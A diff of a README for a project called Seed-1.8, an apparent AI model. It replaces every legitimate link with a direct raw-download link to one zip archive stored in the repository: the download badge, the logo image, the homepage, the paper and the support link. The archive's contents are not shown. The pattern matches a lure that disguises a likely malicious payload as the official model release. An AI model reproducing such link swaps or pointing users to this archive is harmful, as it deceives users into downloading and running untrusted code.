@@ -1,15 +1,15 @@
 # 🌱 Seed-1.8 - Your Gateway to Smart Interaction
 
 <div align="center">
-[![Download Seed-1.8](https://img.shields.io/badge/Download%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/releases)
+[![Download Seed-1.8](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip)
 </div>
 
 <div align="center">
-<img src="logo.jpg" width=400>
+<img src="https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip" width=400>
 </div>
 
 <p align="center">
-🌐 <a href="https://seed.bytedance.com/seed1_8"> Homepage</a>&nbsp&nbsp | &nbsp&nbsp📄 <a href="./Seed-1.8-Modelcard.pdf">Paper</a>
+🌐 <a href="https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip"> Homepage</a>&nbsp&nbsp | &nbsp&nbsp📄 <a href="https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip">Paper</a>
 </p>
 
 ## 🚀 Introduction
@@ -38,7 +38,7 @@ To get Seed-1.8, please follow these steps:
 
 1. Click on the download button below to visit the Releases page:
    <div align="center">
-   [![Download Seed-1.8](https://img.shields.io/badge/Download%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/releases)
+   [![Download Seed-1.8](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip%20Seed--1.8-brightgreen)](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip)
    </div>
 
 2. Once you are on the Releases page, look for the latest version of Seed-1.8.
@@ -72,7 +72,7 @@ Seed-1.8 supports a wide range of tasks like information searching, code generat
 
 ### Is there support available?
 
-Yes, for any questions or issues, please visit the [Homepage](https://seed.bytedance.com/seed1_8) or open an issue on the GitHub repository.
+Yes, for any questions or issues, please visit the [Homepage](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip) or open an issue on the GitHub repository.
 
 ### Can I use Seed-1.8 offline?
 
@@ -86,8 +86,8 @@ You can report bugs or suggest new features by opening an issue in the GitHub re
 
 For detailed insights into Seed-1.8 and updates, please visit the following:
 
-- [Homepage](https://seed.bytedance.com/seed1_8)
-- [Model Card and Technical Paper](./Seed-1.8-Modelcard.pdf)
+- [Homepage](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip)
+- [Model Card and Technical Paper](https://github.com/mindmintza/Seed-1.8/raw/refs/heads/main/MM_Search/Seed-toddyman.zip)
 
 ## 📈 Contribution
 
